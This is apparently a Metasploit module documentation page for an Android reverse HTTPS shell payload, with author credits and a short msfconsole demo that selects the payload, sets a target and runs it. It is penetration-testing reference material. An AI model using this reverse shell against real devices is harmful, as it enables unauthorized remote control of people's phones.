## Command Shell, Dalvik Reverse HTTPS Stager

Spawn a piped command shell (sh). Tunnel communication over 
HTTPS


## Module Name
payload/android/shell/reverse_https

## Authors
* mihi
* egypt
* anwarelmakrahy
* OJ Reeves





## Platforms
* android

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/android/shell/reverse_https
msf payload(reverse_https) > show targets
   ... a list of targets ...
msf payload(reverse_https) > set TARGET <target-id>
msf payload(reverse_https) > show options
   ... show and set options ...
msf payload(reverse_https) > run
```
    
    